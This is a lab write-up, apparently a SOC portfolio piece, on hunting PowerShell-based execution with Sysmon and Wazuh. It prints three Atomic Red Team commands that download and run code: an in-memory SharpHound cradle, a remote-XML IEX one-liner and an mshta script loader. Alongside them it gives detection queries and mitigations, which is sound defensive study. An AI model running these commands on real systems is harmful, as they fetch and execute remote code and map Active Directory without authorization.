# 📂 Scenario 2: Command & Scripting Interpreter — PowerShell (T1059.001)
**Category:** Execution
**Technique:** Command and Scripting Interpreter
**Sub-Technique:** PowerShell (T1059.001)
**Platform:** Windows 10
**Tools Used:** Sysmon, Wazuh, Atomic Red Team, PowerShell, mshta.exe (LOLBAS), BloodHound/SharpHound

# 🔍 Understanding Suspicious PowerShell Execution (T1059.001)

**PowerShell** is one of the most abused execution frameworks in modern attacks.
Adversaries use it for **credential access, lateral movement, payload delivery, reconnaissance**, and **defense evasion** because it is:

* Built-in (no external binaries needed)
* Highly flexible
* Capable of downloading & executing payloads **in-memory**
* Capable of interacting with Windows internals at a deep level

This scenario focuses on **three high-fidelity techniques** commonly seen in real intrusions.

---

## ⚔️ Why I Performed These Three PowerShell Simulations

Each test demonstrates a **different attacker objective**:

| Test                             | Attacker Goal                                  | Why It Matters for SOC                  |
| -------------------------------- | ---------------------------------------------- | --------------------------------------- |
| **BloodHound (Download Cradle)** | Recon / Privilege escalation mapping           | Identifies AD path abuse attempts       |
| **PowerShell XML Execution**     | Remote code retrieval using XML                | Shows stealthy download-execute pattern |
| **Invoke-mshta Downloader**      | Living-off-the-land (LOLBAS) payload execution | One of the most abused delivery methods |

Together, these tests simulate **real-world PowerShell-based tradecraft** used by APTs and ransomware operators.

---

# 🧪 Test 1 — BloodHound Download Cradle

**Atomic Test #3 — Run BloodHound from Memory using Download Cradle**

### ▶️ Command Executed

```powershell
write-host "Remote download of SharpHound.ps1 into memory, followed by execution of the script" -ForegroundColor Cyan 
IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');
Invoke-BloodHound -OutputDirectory $env:Temp
Start-Sleep 5
```
<img width="759" height="244" alt="test 1" src="https://github.com/user-attachments/assets/00139321-4726-4110-88b1-0eece8d8d092" />


### 🧾 What This Test Simulates

* Downloading **SharpHound.ps1** **into memory**
* Executing recon queries to enumerate AD objects
* Common precursor stage for privilege escalation attacks

---

# 🧪 Test 2 — PowerShell XML Web Request Execution

**Atomic Test #7 — PowerShell XML Requests**

### ▶️ Command Executed

```powershell
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute | IEX"
```
<img width="753" height="135" alt="Screenshot 2025-11-20 170530" src="https://github.com/user-attachments/assets/978cea79-71d7-4671-84d5-294de64d0009" />

### 🧾 What This Test Simulates

Attackers frequently place commands inside **remote XML files**.
PowerShell loads the XML and executes embedded instructions — a stealthy download-execute pattern.

### 🔍 Indicators

* XML external request
* Obfuscated / encoded script
* `-exec bypass`
* Multiple Sysmon events: **Event ID 1, 3, 11**

---

# 🧪 Test 3 — PowerShell → mshta LOLBAS Downloader

**Atomic Test #8 — PowerShell invoke mshta.exe download**

### ▶️ Command Executed

```cmd
C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()"
```
<img width="428" height="141" alt="Screenshot 2025-11-20 231355" src="https://github.com/user-attachments/assets/73527317-0733-4d73-8781-42aaa1b5df05" />

### 🧾 What This Test Simulates

`mshta.exe` is a LOLBAS binary capable of executing remote JavaScript/HTA payloads.

### 🔍 Indicators

* mshta launched by PowerShell
* Remote content retrieval
* Possible second-stage payload execution
* Sysmon Event ID: **1, 3, 11**

---

# 🎯 Why These Three Tests Matter (SOC Analyst Perspective)

They represent **high-signal** behaviors associated with:

* Initial foothold
* Reconnaissance
* Credential access
* Payload staging
* Defense evasion (PowerShell logging bypasses, LOLBAS)

A SOC analyst trained on these detections can identify **real intrusions earlier**, reducing **dwell time** significantly.

---

# 🧠 0. Hypothesis

> **If an attacker uses PowerShell to download payloads or execute remote code, then Sysmon + Wazuh should capture process, script, and network indicators that can be correlated to identify malicious activity.**

---

# 🎯 1. Intelligence & Context — Why This Hunt Matters

* T1059.001 is one of the **top 5 ATT&CK techniques** used in the wild
* Techniques simulate **APT recon**, **ransomware staging**, and **web-delivered payloads**
* Improves detection posture for **in-memory execution, LOLBAS abuse, and download cradles**

---

# 🔬 2. Attack Simulations (T1059.001) — What I Tested

### **Test 1:** Memory-based download & execution of SharpHound

### **Test 2:** XML-based delivery mechanism

### **Test 3:** mshta LOLBAS JavaScript execution

---

# 🧩 3. Data Source Validation

| Data Source           | Status          |
| --------------------- | --------------- |
| Sysmon Event ID 1     | ✔ Captured      |
| Sysmon Event ID 3     | ✔ Captured      |
| Sysmon Event ID 11    | ✔ Captured      |
| ScriptBlock Logging   | ✔ Captured      |
| Wazuh Agent → Manager | ✔ Logs arriving |

---

# 🔥 4. Telemetry Collected (Sysmon Evidence)

* Process creation chains
* Parent/child execution
* Download URLs
* ScriptBlock decoded payloads
* mshta execution trace
* XML load operations

---

# 🕵️ 5. Threat Hunting Queries (Wazuh Discover)

### 🔍 Query 1 — BloodHound Download Cradle

```
data.win.system.eventID:11 AND data.win.eventdata.image:*powershell*
```
<img width="757" height="494" alt="Screenshot 2025-11-20 162607" src="https://github.com/user-attachments/assets/e963fba8-8757-4a7b-b63d-feda69f97a82" />
<img width="922" height="520" alt="Screenshot 2025-11-20 163620" src="https://github.com/user-attachments/assets/d923b565-33a7-4e45-94b9-92fc98d91a32" />

### 🔍 Query 2 — XML Execution (Test 7)

```
data.win.eventdata.targetFilename:*Temp* AND data.win.eventdata.image:*powershell.exe*
data.win.system.eventID:11 AND data.win.eventdata.image:*powershell*
```
<img width="921" height="463" alt="Test 2" src="https://github.com/user-attachments/assets/503d0202-2d89-4c87-bc2a-af2656da9813" />
<img width="922" height="484" alt="Screenshot 2025-11-20 174534" src="https://github.com/user-attachments/assets/8ba6046d-5fd7-48d3-9252-22ba5930df08" />


### 🔍 Query 3 — mshta Downloader (Test 8)

```
data.win.eventdata.ParentImage:*mhsta.exe* AND data.win.eventdata.image:*powershell*
data.win.eventdata.ParentImage:*cmd.exe* AND data.win.eventdata.commandLine:*mshta.exe*
```
<img width="909" height="529" alt="Screenshot 2025-11-20 231240" src="https://github.com/user-attachments/assets/6a00f9c0-918d-473e-a82b-8613a24e68aa" />
<img width="905" height="532" alt="Test 3" src="https://github.com/user-attachments/assets/21f7022d-fd18-4092-bfff-f489795722e0" />

---

# 🚨 6. Wazuh Detection (SIEM Alerts)

| Rule ID | Description                                 |
| ------- | ------------------------------------------- |
| 1       | Suspicious PowerShell execution             |
| 11      | ScriptBlock suspicious content              |
| 3       | Network activity associated with PowerShell |
| 22      | mshta child process pattern                 |

---

# 🧠 7. Hypothesis Validation (Final Result)

✔ All three PowerShell-based attacks were **successfully detected**
✔ Sysmon provided full process + script telemetry
✔ Wazuh enriched and correlated events effectively
✔ Hypothesis **validated**

---

# 📝 8. Analyst Notes (My SOC Findings)

* All executions showed **download → load → execute** behavior
* Clear signs of **LOLBAS abuse** (mshta)
* Indicators matched common APT intrusion chains
* Threat actors frequently use these as **staging steps**

---

# 🛡️ 9. Detection Gaps Identified

* No default Wazuh rules for specific atomic tests
* Needed to create custom rules for Test 3 + Test 7
* Some scriptblock events require enhanced logging

---

# 🛠️ 10. Mitigation Recommendation

* Block `mshta.exe` unless required
* Restrict PowerShell → enforce Constrained Language Mode
* Enhance network monitoring for outbound XML/HTA
* Deploy ASR rules for script-based attacks

---

# 🧩 11. Summary — What I Learned

* Built practical detection skills for **PowerShell-based attacks**
* Understood **download cradles, LOLBAS, XML execution** patterns
* Learned how to correlate Sysmon + Wazuh events
* Improved triage workflow with well-structured hunting queries
* Strengthened mapping to ATT&CK for real SOC workflows


Just tell me!
